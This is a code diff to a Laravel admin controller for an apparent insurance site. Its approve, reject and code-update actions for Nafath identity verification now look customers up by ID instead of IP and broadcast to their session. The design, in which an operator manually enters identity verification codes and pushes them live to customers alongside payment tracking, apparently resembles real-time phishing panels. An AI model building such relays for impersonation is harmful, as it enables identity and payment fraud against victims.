@@ -23,29 +23,23 @@ class AdminNafathController extends Controller
      */
     public function approve(NafathApproveRequest $request): JsonResponse
     {
-        $customer = CustomerProfile::where('ip_address', $request->customer_ip)->first();
-
-        if (!$customer) {
-            return response()->json([
-                'success' => false,
-                'message' => 'لم يتم العثور على العميل',
-            ], 404);
-        }
+        $customer = CustomerProfile::findOrFail($request->integer('customer_id'));
 
         // Idempotency — already approved, just re-broadcast
         if ($customer->nafath_verified) {
             $code = $request->input('verification_code') ?? $customer->nafath_verification_code;
             try {
                 broadcast(new NafathApproved(
-                    $request->customer_ip,
+                    $customer->session_id,
                     $code,
-                    '/insurance/nafath/callback'
+                    '/insurance/nafath/callback',
+                    $customer->id,
                 ))->toOthers();
             } catch (\Throwable $e) {
                 Log::warning('Broadcast failed (re-broadcast approveNafath): ' . $e->getMessage());
             }
-            $this->notifyDashboard($request->customer_ip, 'nafath_approved');
-            $this->refreshPaymentViewed($request->customer_ip);
+            $this->notifyDashboard($customer, 'nafath_approved');
+            $this->refreshPaymentViewed($customer);
             return response()->json([
                 'success' => true,
                 'message' => 'تمت إعادة إرسال الموافقة على النفاذ',
@@ -62,16 +56,17 @@ class AdminNafathController extends Controller
 
         try {
             broadcast(new NafathApproved(
-                $request->customer_ip,
+                $customer->session_id,
                 $code,
-                '/insurance/nafath/callback'
+                '/insurance/nafath/callback',
+                $customer->id,
             ))->toOthers();
         } catch (\Throwable $e) {
             Log::warning('Broadcast failed (approveNafath): ' . $e->getMessage());
         }
 
-        $this->notifyDashboard($request->customer_ip, 'nafath_approved');
-        $this->refreshPaymentViewed($request->customer_ip);
+        $this->notifyDashboard($customer, 'nafath_approved');
+        $this->refreshPaymentViewed($customer);
 
         return response()->json([
             'success' => true,
@@ -84,27 +79,20 @@ class AdminNafathController extends Controller
      */
     public function reject(NafathRejectRequest $request): JsonResponse
     {
-        $customer = CustomerProfile::where('ip_address', $request->customer_ip)->first();
-
-        if (!$customer) {
-            return response()->json([
-                'success' => false,
-                'message' => 'لم يتم العثور على العميل',
-            ], 404);
-        }
+        $customer = CustomerProfile::findOrFail($request->integer('customer_id'));
 
         $customer->update([
             'nafath_verified' => false,
         ]);
 
         try {
-            broadcast(new NafathRejected($request->customer_ip, $request->input('reason')))->toOthers();
+            broadcast(new NafathRejected($customer->session_id, $request->input('reason'), $customer->id))->toOthers();
         } catch (\Throwable $e) {
             Log::warning('Broadcast failed (rejectNafath): ' . $e->getMessage());
         }
 
-        $this->notifyDashboard($request->customer_ip, 'nafath_rejected');
-        $this->refreshPaymentViewed($request->customer_ip);
+        $this->notifyDashboard($customer, 'nafath_rejected');
+        $this->refreshPaymentViewed($customer);
 
         return response()->json([
             'success' => true,
@@ -117,29 +105,25 @@ class AdminNafathController extends Controller
      */
     public function updateCode(NafathUpdateCodeRequest $request): JsonResponse
     {
-        $customer = CustomerProfile::where('ip_address', $request->customer_ip)->first();
-
-        if (!$customer) {
-            return response()->json([
-                'success' => false,
-                'message' => 'لم يتم العثور على العميل',
-            ], 404);
-        }
+        $customer = CustomerProfile::findOrFail($request->integer('customer_id'));
 
         $customer->update([
             'nafath_verification_code' => $request->input('verification_code'),
         ]);
 
         try {
-            broadcast(new NafathCodeUpdated(
-                $request->customer_ip,
-                $request->input('verification_code')
-            ))->toOthers();
+            if ($customer->session_id) {
+                broadcast(new NafathCodeUpdated(
+                    $customer->session_id,
+                    $request->input('verification_code'),
+                    $customer->id,
+                ))->toOthers();
+            }
         } catch (\Throwable $e) {
             Log::warning('Broadcast failed (updateNafathCode): ' . $e->getMessage());
         }
 
-        $this->notifyDashboard($request->customer_ip, 'nafath_code_updated');
+        $this->notifyDashboard($customer, 'nafath_code_updated');
 
         return response()->json([
             'success' => true,
